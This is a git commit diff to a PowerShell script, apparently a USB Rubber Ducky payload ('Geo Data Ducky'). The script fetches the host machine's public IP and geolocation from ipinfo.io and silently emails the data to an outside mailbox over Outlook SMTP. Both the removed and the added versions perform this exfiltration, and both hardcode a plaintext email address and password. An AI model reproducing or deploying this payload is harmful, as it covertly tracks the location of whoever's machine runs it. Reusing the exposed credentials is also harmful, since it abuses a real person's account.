eb53e7f84a8f7082ad283def8f04990ae208e76b
Fixo1 <francois.machere@epitech.eu>
2024-04-28 14:42:53 +0200

    Try ?

--- script.ps1
+++ script.ps1
@@ -1,26 +1,19 @@
 Try {
-    $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
-    $jsonContent = $ipInfo | ConvertTo-Json -Depth 10
-
-    $SmtpServer = 'smtp-mail.outlook.com'
-    $SmtpUser = 'usulmadhi@outlook.fr'
-    $SmtpPass = 'Eusebe2000'  # Replace with app password if 2FA is enabled
-    $Message = $jsonContent
-
-    $MailMessage = New-Object System.Net.Mail.MailMessage
-    $MailMessage.From = 'UsulMadhi@outlook.fr'
-    $MailMessage.To.Add('UsulMadhi@outlook.fr')
-    $MailMessage.Subject = 'Complete Geolocation Data'
-    $MailMessage.Body = $Message
-
-    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-    $SMTPClient.EnableSsl = $true
-    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
-    $SMTPClient.Send($MailMessage)
-    Write-Host "Email sent successfully!"
+	$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
+	$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
+	$Message = $jsonContent
+	$EmailFrom = "usulmadhi@outlook.fr"
+	$EmailTo = "UsulMadhi@proton.me"
+	$Subject = "Geo Data Ducky"
+	$Body = $Message
+	$SMTPServer = "smtp.outlook.com"
+	$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+	$SMTPClient.EnableSsl = $true
+	$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usulmadhi@outlook.fr", "Eusebe2000");
+	$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+    	Write-Host "Email sent successfully!"
 }
 Catch {
-    Write-Host "Error sending email: $_"
+    	Write-Host "Error sending email: $_"
 }
-
 
